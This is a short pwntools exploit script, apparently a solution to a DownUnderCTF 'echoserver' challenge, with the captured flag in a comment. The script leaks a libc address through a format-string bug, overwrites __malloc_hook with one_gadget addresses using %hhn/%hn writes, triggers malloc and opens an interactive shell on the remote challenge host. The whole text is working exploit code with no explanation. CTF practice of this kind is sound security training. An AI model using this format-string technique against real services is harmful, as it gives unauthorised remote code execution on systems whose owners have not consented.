#exploit for echoserver
#DUCTF{D@N6340U$_AF_F0RMAT_STTR1NG$}
from pwn import *
elf = ELF("./echos")
context.binary=elf
libc=ELF('./libc6_2.27-3ubuntu1_amd64.so')
gadgets=[0x4f2c5,0x4f322,0xe569f,0xe5858,0xe585f,0xe5863,0x10a38c,0x10a398]
for gadget in gadgets:
	target=remote('chal.duc.tf',30001)

	def sla(string,val):
		target.sendlineafter(string,val)

	def sa(string,val):
		target.sendafter(string,val)

	payload="%19$p."
	target.sendline(payload)
	libc_base=int(target.recvuntil(".").strip(".")[2:],16)-0x21b97
	libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	libc_gadget=libc_base+gadget
	n1=int(hex(libc_gadget)[10:14],16)
	n2=int(hex(libc_gadget)[8:10],16)
	payload="%"+str(n2)+"x"
	payload+="%13$hhn"
	payload+="%"+str(n1-n2)+"x"
	payload+="%12$hn"
	payload=payload.ljust(32,"A")
	payload+=p64(libc_malloc_hook)
	payload+=p64(libc_malloc_hook+2)
	target.sendline(payload)
	payload="%100000x"
	target.sendline(payload)
	target.interactive()
